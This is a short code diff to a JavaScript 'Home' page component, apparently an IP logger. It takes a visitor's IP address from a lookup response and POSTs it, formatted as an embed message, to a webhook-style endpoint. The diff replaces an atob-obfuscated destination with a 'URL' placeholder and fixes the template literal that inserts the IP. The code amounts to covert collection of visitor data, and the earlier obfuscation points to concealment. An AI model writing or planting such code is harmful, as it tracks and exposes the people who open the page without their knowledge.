@@ -13,7 +13,7 @@ export default function Home() {
                 embeds: [content],
             };
 
-            fetch(atob("URL"), {
+            fetch("URL", {
                 method: 'POST',
                 headers: {
                     "Content-Type": "application/json"
@@ -29,7 +29,7 @@ export default function Home() {
                 response.json().then((inputData) => {
                     let content = {
                         title: "hi",
-                        description: `{inputData.ip}`
+                        description: `${inputData.ip}`
                     };
                     send(content);
                 }).catch(console.error);
